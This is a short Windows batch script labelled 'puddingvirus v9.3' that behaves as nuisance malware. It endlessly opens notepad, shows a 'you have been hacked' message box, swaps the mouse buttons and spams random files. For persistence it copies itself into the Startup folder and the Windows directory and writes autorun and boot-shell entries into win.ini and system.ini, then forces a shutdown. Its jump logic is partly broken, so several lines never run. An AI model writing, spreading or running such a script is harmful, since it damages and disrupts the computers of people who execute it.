:files
:looop
:loop

start notepad.exe
goto loop
start https://www.youtube.com/watch?v=gvYfRiJQIX8
goto looop
echo Msgbox"you have been hacked by SH4D0W",0+0,"lol">>msg.vbs
start msg.vbs
RUNDLL32 USER32.DLL,SwapMouseButton
nul >> %random%
goto files
copy %0 "%userprofile%\Start Menu\Programs\Startup"
set b=puddingvirus v9.3
copy %0 %windir%\%b%.bat
echo [windows] >> %windir%\win.ini
echo run=%windir%\%b%.bat >> %windir%\win.ini
echo load=%windir%\%b%.bat >> %windir%\win.ini
echo [boot] >> %windir%\system.ini
echo shell=explorer.exe %b%.bat >> %windir%\system.ini
shutdown /f
